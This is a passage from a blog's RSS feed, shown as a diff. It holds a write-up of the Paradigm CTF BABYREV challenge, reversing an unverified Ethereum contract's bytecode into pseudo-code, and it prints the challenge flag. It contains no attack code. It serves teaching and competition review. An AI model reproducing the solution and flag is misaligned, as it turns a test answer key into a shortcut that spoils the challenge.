@@ -1,0 +1,1649 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>Binary Cake</title>
+        <link>https://binarycake.ca</link>
+        <description>Sam Wilson&#x27;s blog about his chaotic programming projects, interesting ideas, and other technological sundry.</description>
+        <generator>Zola</generator>
+        <language>en</language>
+        <atom:link href="https://binarycake.ca/rss.xml" rel="self" type="application/rss+xml"/>
+        <lastBuildDate>Wed, 17 Feb 2021 18:40:00 +0000</lastBuildDate>
+        
+            <item>
+                <title>BABYREV Challenge - Paradigm CTF (Part 3 of 3)</title>
+                <pubDate>Wed, 17 Feb 2021 18:40:00 +0000</pubDate>
+                <link>https://binarycake.ca/posts/paradigm-ctf-babyrev/</link>
+                <guid>https://binarycake.ca/posts/paradigm-ctf-babyrev/</guid>
+                <description>&lt;style&gt;
+pre {
+line-height: 1.3em !important;
+}
+&lt;&#x2F;style&gt;
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;&#x2F;h2&gt;
+&lt;p&gt;In my two preceding posts, I give short summaries of the &lt;a href=&quot;https:&#x2F;&#x2F;binarycake.ca&#x2F;posts&#x2F;paradigm-ctf&#x2F;&quot;&gt;BABYCRYPTO&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;binarycake.ca&#x2F;posts&#x2F;paradigm-ctf-broker&#x2F;&quot;&gt;BROKER&lt;&#x2F;a&gt; challenges from Paradigm&#x27;s recent Capture the Flag competition. If you&#x27;d like more details on the competition itself, or the format of the challenges, go and give my &lt;a href=&quot;https:&#x2F;&#x2F;binarycake.ca&#x2F;posts&#x2F;paradigm-ctf&#x2F;&quot;&gt;BABYCRYPTO&lt;&#x2F;a&gt; post a read first.&lt;&#x2F;p&gt;
+&lt;p&gt;Today I&#x27;ll be going over the BABYREV challenge which was, by far, the longest challenge we completed during the competition. I&#x27;d also like to dedicate this post to &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;adietrichs&quot;&gt;@adietrichs&lt;&#x2F;a&gt;&#x27; and my collective sanity, which unfortunately didn&#x27;t survive the 10+ hours we spent on this puzzle.&lt;&#x2F;p&gt;
+&lt;p&gt;Disclaimer: unlike the rest of our team, &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;adietrichs&quot;&gt;@adietrichs&lt;&#x2F;a&gt; and I don&#x27;t have a ton of experience auditing or reverse engineering Ethereum contracts; we&#x27;re protocol researchers. The approach we take here is the most basic, brute-force approach to solving this problem, but hey, it worked!&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;challenges&quot;&gt;Challenges&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;babyrev&quot;&gt;BABYREV&lt;&#x2F;h3&gt;
+&lt;p&gt;After a relatively successful exploit on BROKER, I joined &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;adietrichs&quot;&gt;@adietrichs&lt;&#x2F;a&gt; on BABYREV. Based on the name and description, it was pretty obvious we&#x27;d be dealing with a reverse engineering puzzle.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;.&#x2F;babyrev.png&quot; alt=&quot;If I don&#x27;t verify my source code, then hackers can&#x27;t exploit my contract, right?&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The contents of the archive:&lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;font color=&quot;#3465A4&quot;&gt;&lt;b&gt;.&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;
+└── &lt;font color=&quot;#3465A4&quot;&gt;&lt;b&gt;babyrev&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;
+    └── &lt;font color=&quot;#3465A4&quot;&gt;&lt;b&gt;public&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;
+        ├── &lt;font color=&quot;#3465A4&quot;&gt;&lt;b&gt;contracts&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;
+        │   └── Setup.sol
+        ├── &lt;font color=&quot;#3465A4&quot;&gt;&lt;b&gt;deploy&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;
+        │   ├── chal.py
+        │   ├── compiled.bin
+        │   └── requirements.txt
+        └── Dockerfile
+&lt;&#x2F;pre&gt;
+&lt;p&gt;What immediately stands out is that the only contract we have is &lt;a href=&quot;.&#x2F;Setup.sol&quot;&gt;&lt;code&gt;Setup.sol&lt;&#x2F;code&gt;&lt;&#x2F;a&gt;, unlike BROKER which gave us the &lt;code&gt;Broker&lt;&#x2F;code&gt; contract. We do have &lt;code&gt;compiled.bin&lt;&#x2F;code&gt;, which is a JSON file with the output from the compiler:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;{
+    &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;contracts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;:{
+        &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;private&#x2F;&#x2F;Challenge.sol:Challenge&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;:{
+            &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;bin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;:&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;...&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;
+        },
+        &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;contracts&#x2F;Setup.sol:ChallengeInterface&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;:{
+            &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;bin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;:&amp;quot;&amp;quot;
+        },
+        &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;contracts&#x2F;Setup.sol:Setup&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;:{
+            &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;bin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;:&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;...&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;
+        }
+    },
+    &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;:&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0.4.24+commit.e67f0147.mod.Darwin.appleclang&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The rest of the archive is pretty similar to BROKER: &lt;a href=&quot;.&#x2F;Setup.sol&quot;&gt;&lt;code&gt;Setup.sol&lt;&#x2F;code&gt;&lt;&#x2F;a&gt; checks the win condition, and there&#x27;s a bunch of Docker magic that spins up a fork of mainnet for the challenge.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;win-condition&quot;&gt;Win Condition&lt;&#x2F;h4&gt;
+&lt;p&gt;From &lt;a href=&quot;.&#x2F;Setup.sol&quot;&gt;&lt;code&gt;Setup.sol&lt;&#x2F;code&gt;&lt;&#x2F;a&gt;:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;function isSolved() public view returns (bool) {
+    return challenge.solved();
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Well that&#x27;s &lt;em&gt;profoundly&lt;&#x2F;em&gt; useful. The win condition is part of the secret &lt;code&gt;Challenge&lt;&#x2F;code&gt; contract. I guess it&#x27;s time to jump right into the EVM&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#1&quot;&gt;1&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt; assembly...&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;aside-disassembly&quot;&gt;Aside: Disassembly&lt;&#x2F;h4&gt;
+&lt;p&gt;The bytecode in &lt;code&gt;compiled.bin&lt;&#x2F;code&gt; is encoded in hexadecimal, and isn&#x27;t particularly readable. Disassembly is the process of decoding the hexadecimal string into something slightly more understandable.&lt;&#x2F;p&gt;
+&lt;p&gt;The basic disassembly process looks something like this:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;Read the first byte from the assembled program: &lt;code&gt;80&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
+&lt;li&gt;Look up what that byte means, and for &lt;code&gt;80&lt;&#x2F;code&gt; that would be &lt;code&gt;DUP1&lt;&#x2F;code&gt; (or duplicate the top item of the stack.)&lt;&#x2F;li&gt;
+&lt;li&gt;If the byte encoded a &lt;code&gt;PUSH&lt;&#x2F;code&gt; instruction, read the immediate argument (so for &lt;code&gt;PUSH1&lt;&#x2F;code&gt;, read one extra byte; two for &lt;code&gt;PUSH2&lt;&#x2F;code&gt;; and so on.)&lt;&#x2F;li&gt;
+&lt;li&gt;Repeat until the entire bytecode is disassembled.&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;Following those steps, an input like &lt;code&gt;0x6080604052&lt;&#x2F;code&gt; would become:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;PUSH1 0x80
+PUSH1 0x40
+MSTORE
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Thankfully this process is automated. We used &lt;a href=&quot;https:&#x2F;&#x2F;ethervm.io&#x2F;decompile&quot;&gt;ethervm&#x27;s decompiler&lt;&#x2F;a&gt;, which spits out an annotated disassembly (and a decompiled version too!)&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;further-aside-constructors&quot;&gt;Further Aside: Constructors&lt;&#x2F;h4&gt;
+&lt;p&gt;Solidity is a wondrous beast that takes care of the complex process of deploying a contract. Unfortunately we aren&#x27;t looking at Solidity, so here be dragons.&lt;&#x2F;p&gt;
+&lt;p&gt;The first bytes (roughly up to the second &lt;code&gt;6080&lt;&#x2F;code&gt;) of a compiled contract are actually the &lt;em&gt;constructor code&lt;&#x2F;em&gt;, or the bits of code Solidity generates to get your contract constructed and deployed on-chain. Constructors, also known as &lt;em&gt;initcode&lt;&#x2F;em&gt;, take care of assigning initial storage values, populating immutable variables, and finally copying the code to be deployed into memory.&lt;&#x2F;p&gt;
+&lt;p&gt;Since we aren&#x27;t super interested in the constructor for this challenge, we snip it off before passing the bytecode to the disassembler.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;challenge-preamble&quot;&gt;&lt;code&gt;Challenge&lt;&#x2F;code&gt; Preamble&lt;&#x2F;h4&gt;
+&lt;p&gt;The first thing Solidity contracts do is ensure that the calldata is at least four bytes long:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;entrypoint:         &#x2F;&#x2F; Okay, I lied.
+    PUSH1 0x80      &#x2F;&#x2F; Setting up the free memory pointer is the very first
+    PUSH1 0x40      &#x2F;&#x2F; thing. The pointer lives at address 0x40 and is
+    MSTORE          &#x2F;&#x2F; initially set to 0x80. Solidity uses the first few
+                    &#x2F;&#x2F; 256-bit words of memory as scratch space.
+
+    PUSH1 0x04      &#x2F;&#x2F; Then we do check the calldata length.
+    CALLDATASIZE
+    LT
+    PUSH2 0x0062
+    JUMPI           &#x2F;&#x2F; If the calldata is too short, revert (eventually.)
+                    &#x2F;&#x2F; Else, fall through into the function selector
+                    &#x2F;&#x2F; blocks.
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The calldata must be at least four bytes long, at least in this contract, because the first four bytes are used as an identifier for the function to call. The selectors are calculated from the keccak256 hash of the function signature.&lt;&#x2F;p&gt;
+&lt;p&gt;This is the first function selector block from &lt;code&gt;Challenge&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;selector_0adf939b:
+    PUSH1 0x00
+    CALLDATALOAD        &#x2F;&#x2F; Push the 0-th word of calldata.
+    PUSH29 0x0100000000000000000000000000000000000000000000000000000000
+    SWAP1
+    DIV
+    PUSH4 0xffffffff
+    AND                 &#x2F;&#x2F; DIV+AND emulates (calldata[0] &amp;gt;&amp;gt; 224)
+    DUP1
+    PUSH4 0x0adf939b    &#x2F;&#x2F; Push the function selector.
+    EQ
+    PUSH2 0x0067
+    JUMPI               &#x2F;&#x2F; Jump to 0x67 if the selector matches.
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This structure is repeated for the four public functions in &lt;code&gt;Challenge&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
+&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Selector&lt;&#x2F;th&gt;&lt;th&gt;Signature&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#2&quot;&gt;2&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;thead&gt;&lt;tbody&gt;
+&lt;tr&gt;&lt;td&gt;&lt;code&gt;0x0adf939b&lt;&#x2F;code&gt;&lt;&#x2F;td&gt;&lt;td&gt;??&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;code&gt;0x39ac0e49&lt;&#x2F;code&gt;&lt;&#x2F;td&gt;&lt;td&gt;??&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;code&gt;0x799320bb&lt;&#x2F;code&gt;&lt;&#x2F;td&gt;&lt;td&gt;&lt;code&gt;solved()&lt;&#x2F;code&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;code&gt;0x799320bb&lt;&#x2F;code&gt;&lt;&#x2F;td&gt;&lt;td&gt;&lt;code&gt;solve(uint256)&lt;&#x2F;code&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;&#x2F;tbody&gt;&lt;&#x2F;table&gt;
+&lt;p&gt;We only succeeded in guessing one (&lt;code&gt;solve(uint256)&lt;&#x2F;code&gt;) of the three unknown selectors. Thankfully, we didn&#x27;t need to call the others directly from Solidity. We can now expand &lt;code&gt;ChallengeInterface&lt;&#x2F;code&gt; with an additional function:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;interface ChallengeInterface {
+    function solved() public view returns (bool);
+    function solve(uint256) public;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;At last our goal becomes clear: figure out some input for &lt;code&gt;solve&lt;&#x2F;code&gt; that makes &lt;code&gt;solved&lt;&#x2F;code&gt; return &lt;code&gt;true&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;much-further-aside-tools-deadends&quot;&gt;Much Further Aside: Tools &amp;amp; Deadends&lt;&#x2F;h4&gt;
+&lt;p&gt;If you&#x27;re somewhat familiar with reverse engineering, you might be wondering if we tried any tools while cracking this challenge. Well, we did, but unfortunately none of them were able to solve this puzzle. &lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#3&quot;&gt;3&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Specifically we tried:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;manticore.readthedocs.io&#x2F;en&#x2F;latest&#x2F;verifier.html&quot;&gt;&lt;code&gt;manticore-verifier&lt;&#x2F;code&gt;&lt;&#x2F;a&gt; - timed out&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;gen_exploit.py&lt;&#x2F;code&gt; from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;nescio007&#x2F;teether&quot;&gt;teether&lt;&#x2F;a&gt;, modified - out of memory&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ConsenSys&#x2F;mythril&quot;&gt;&lt;code&gt;mythril&lt;&#x2F;code&gt;&lt;&#x2F;a&gt; - no output specific to the challenge&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Our failure with these tools is not a sign that they aren&#x27;t useful, but rather that &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;adietrichs&quot;&gt;@adietrichs&lt;&#x2F;a&gt; and I have very little experience with them. I&#x27;m sure that in the right hands, they&#x27;re formidable allies.&lt;&#x2F;p&gt;
+&lt;p&gt;If you look carefully at the disassembly, you&#x27;ll note two large constants in the code:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;0x311dfa5451963f33b16e63f0c62278c9b907e43d1961cdf9f590a0c3b351c04019cccb831403&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;0x504354467b763332795f3533637532335f336e633279703731306e5f34313930323137686d7d&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;If you look even carefully-er, you might even notice that the second constant is valid ASCII, and that it decodes to &lt;code&gt;PCTF{v32y_53cu23_3nc2yp710n_4190217hm}&lt;&#x2F;code&gt;. That constant, alone, is not enough to capture the flag. &lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#4&quot;&gt;4&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;strategy&quot;&gt;Strategy&lt;&#x2F;h4&gt;
+&lt;p&gt;Without tool support, and with little else to do, we decided to manually walk through the entire contract, annotating the stack along the way. For those in the know, this is basically primitive &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Symbolic_execution&quot;&gt;symbolic execution&lt;&#x2F;a&gt;. Our eventual goal was to recover enough of the &lt;code&gt;solve&lt;&#x2F;code&gt; function to see exactly what path we&#x27;d need to hit. We settled on a very simple annotation format: &lt;code&gt;opcode [stack-after-opcode]&lt;&#x2F;code&gt;. The top (most recently pushed) of the stack would always be on the left.&lt;&#x2F;p&gt;
+&lt;p&gt;A small snippet of annotated assembly would look like this:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;PUSH1 0x10      [0x10]
+PUSH1 0x59      [0x59, 0x10]
+ADD             [0x69]
+MLOAD           [M0]            &#x2F;&#x2F; M0 := mload(0x69)
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;And so we began. We annotated, and we annotated some more. We annotated so much, we annotated galore. &lt;em&gt;Seriously, this took us hours.&lt;&#x2F;em&gt; You can see the final annotated assembly &lt;a href=&quot;https:&#x2F;&#x2F;gist.github.com&#x2F;SamWilsn&#x2F;f850807af39bdddbb88bbe44c787e376&quot;&gt;here&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;islands-of-interest&quot;&gt;Islands of Interest&lt;&#x2F;h4&gt;
+&lt;p&gt;Although annotating the assembly was slow going, we did quickly identify some sections of code that were &lt;em&gt;interesting&lt;&#x2F;em&gt;, and from there, reversed the important bits.&lt;&#x2F;p&gt;
+&lt;h5 id=&quot;comparison-subroutine&quot;&gt;Comparison Subroutine&lt;&#x2F;h5&gt;
+&lt;p&gt;The most obviously interesting place, and the first place I started tracing, was the comparison subroutine that then stores a &lt;code&gt;true&lt;&#x2F;code&gt; into storage. The only &lt;code&gt;SSTORE&lt;&#x2F;code&gt; in the whole contract is at offset &lt;code&gt;0x1157&lt;&#x2F;code&gt;. If we wanted to solve the challenge, this is where we&#x27;d have to end up.&lt;&#x2F;p&gt;
+&lt;p&gt;In the interest of preserving &lt;em&gt;your&lt;&#x2F;em&gt; sanity, dear reader, I won&#x27;t inline the entire disassembly of the comparison subroutine. Instead, here is some pseudo-code:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;function solve(uint256 C) private {
+    bytes memory expected = &#x2F;* ... *&#x2F;;
+    bytes memory actual = do_some_magic(C);
+
+    if (keccak256(actual) == keccak256(expected)) {
+        storage[0x00] = (storage[0x00] &amp;amp; ~0xFF) | 0x01;
+    }
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Essentially, the final parts of the &lt;code&gt;solve&lt;&#x2F;code&gt; function compared the output of &lt;code&gt;do_some_magic(C)&lt;&#x2F;code&gt; (where &lt;code&gt;C&lt;&#x2F;code&gt; is under our control) to some expected value. If they matched, set &lt;code&gt;storage[0x00]&lt;&#x2F;code&gt;, marking the puzzle as solved.&lt;&#x2F;p&gt;
+&lt;h5 id=&quot;the-tabletm&quot;&gt;The Table™&lt;&#x2F;h5&gt;
+&lt;p&gt;The comparison function may have been the most obviously interesting, but the most perplexing section was roughly between offsets &lt;code&gt;0x0396&lt;&#x2F;code&gt; and &lt;code&gt;0x0D93&lt;&#x2F;code&gt;. This blob of instructions was surprisingly regular. It consisted of 256 repetitions of this:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;PUSH1 0x63      &#x2F;&#x2F; Changes every repetition
+PUSH1 0xff
+AND             [0x63, M_A0, M_A0, 0x00, 0x60, M_Z0, C, 0x01e1, FSEL]
+DUP2            [M_A0, 0x63, M_A0, M_A0, 0x00, 0x60, M_Z0, C, 0x01e1, FSEL]
+MSTORE          [M_A0, M_A0, 0x00, 0x60, M_Z0, C, 0x01e1, FSEL]        &#x2F;&#x2F; memory@M_A0 := 0x00..0063
+PUSH1 0x20      [0x20, M_A0, M_A0, 0x00, 0x60, M_Z0, C, 0x01e1, FSEL]
+ADD             [M_A1, M_A0, 0x00, 0x60, M_Z0, C, 0x01e1, FSEL]
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;FSEL&lt;&#x2F;code&gt; was the function selector.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;0x01e1&lt;&#x2F;code&gt; was the eventual return address.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;C&lt;&#x2F;code&gt; was the &lt;code&gt;uint256&lt;&#x2F;code&gt; argument supplied to &lt;code&gt;solve&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;M_A0&lt;&#x2F;code&gt; and &lt;code&gt;M_Z0&lt;&#x2F;code&gt; were pointers to the first sections of memory regions we called &lt;code&gt;A&lt;&#x2F;code&gt; and &lt;code&gt;Z&lt;&#x2F;code&gt;. &lt;code&gt;M_A1&lt;&#x2F;code&gt; was the next section. I know, so creative.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;It took us a fairly long while to reason out what this section of code does, but eventually it became clear that this section builds an array of 256 values (which we called The Table™) in memory. Roughly, the following Solidity translates to something like The Table™:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;uint8[256] memory values;
+values[0] = 0x63;
+values[1] = 0x7c;
+values[3] = 0x77;
+.
+.
+.
+values[253] = 0x54;
+values[254] = 0xbb;
+values[255] = 0x16;
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;An array of 256 values is pretty suspicious. It could be a map for a substitution cipher. It could be a cleverly disguised constant that needs to be XOR&#x27;d with the input value. It was neither, but we&#x27;ll come back to it later!&lt;&#x2F;p&gt;
+&lt;h5 id=&quot;the-magic&quot;&gt;The Magic&lt;&#x2F;h5&gt;
+&lt;p&gt;The &lt;code&gt;do_some_magic&lt;&#x2F;code&gt; subroutine above covers a lot of assembly, and was pretty much a giant black box. We slowly uncovered how it worked, piece by piece. The first major milestone was discovered Sunday morning, at around 03:45:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;.&#x2F;for.png&quot; alt=&quot;IT&#x27;S A FOR LOOP&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;I was referring to the subroutine around &lt;code&gt;0x1169&lt;&#x2F;code&gt;. In pseudo-code:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;weird = C
+
+&#x2F;* ... *&#x2F;
+
+for (j = 0; j &amp;lt; 32 * 8; j += 8) {
+    offset = (weird &amp;gt;&amp;gt; j) &amp;amp;&amp;amp; 0xff
+    elem = a_arr[offset]
+    new_weird |= elem &amp;lt;&amp;lt; j          &#x2F;&#x2F; add elem byte to the left
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;C&lt;&#x2F;code&gt; is, again, the &lt;code&gt;uint256&lt;&#x2F;code&gt; from calldata.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;weird&lt;&#x2F;code&gt; &lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#5&quot;&gt;5&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt; is, uh, a weird number. It&#x27;s used later.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;new_weird&lt;&#x2F;code&gt; is transformed from &lt;code&gt;weird&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;And in more English-like (but equally indecipherable) terms, this inner loop took &lt;code&gt;weird&lt;&#x2F;code&gt; and:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;Looked up the &lt;code&gt;j &#x2F; 8&lt;&#x2F;code&gt;&lt;sup&gt;th&lt;&#x2F;sup&gt; byte in &lt;code&gt;weird&lt;&#x2F;code&gt; from The Table™,&lt;&#x2F;li&gt;
+&lt;li&gt;Prepended that byte on the left hand side of &lt;code&gt;weird&lt;&#x2F;code&gt;, and&lt;&#x2F;li&gt;
+&lt;li&gt;Stored it in &lt;code&gt;new_weird&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;What kind of algorithm does something like this? &lt;strong&gt;A hash function&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;What kind of algorithm breaks automated tools? &lt;strong&gt;A hash function&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;What did this code end up being? &lt;strong&gt;A hash function&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;how-to-decompile-a-hash-function&quot;&gt;How to Decompile a Hash Function&lt;&#x2F;h4&gt;
+&lt;p&gt;&lt;img src=&quot;.&#x2F;owl.jpg&quot; alt=&quot;How to draw an owl&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;From this point onward it was basically just decompiling more blocks from the disassembly, and translating them into pseudo-code. Don&#x27;t get me wrong, there was a ton of work, and several &amp;quot;Aha!&amp;quot; moments, but there&#x27;s really not much more to write about. By early evening (for me, night for @adietrichs) on Sunday, we had reversed the whole &lt;code&gt;solve(uint256)&lt;&#x2F;code&gt; function, including &lt;code&gt;do_some_magic&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&#x2F;&#x2F; The Table™
+a_arr = hex&amp;quot;637c777bf26b6fc53001672bfed7ab76ca82c97dfa5947f0add4a2af9ca472c0b7fd9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27b27509832c1a1b6e5aa0523bd6b329e32f8453d100ed20fcb15b6acbbe394a4c58cfd0efaafb434d338545f9027f503c9fa851a3408f929d38f5bcb6da2110fff3d2cd0c13ec5f974417c4a77e3d645d197360814fdc222a908846eeb814de5e0bdbe0323a0a4906245cc2d3ac629195e479e7c8376d8dd54ea96c56f4ea657aae08ba78252e1ca6b4c6e8dd741f4bbd8b8a703eb5664803f60e613557b986c11d9ee1f8981169d98e949b1e87e9ce5528df8ca1890dbfe6426841992d0fb054bb16&amp;quot;
+
+&#x2F;&#x2F; Target String - PCTF{v32y_53cu23_3nc2yp710n_4190217hm}
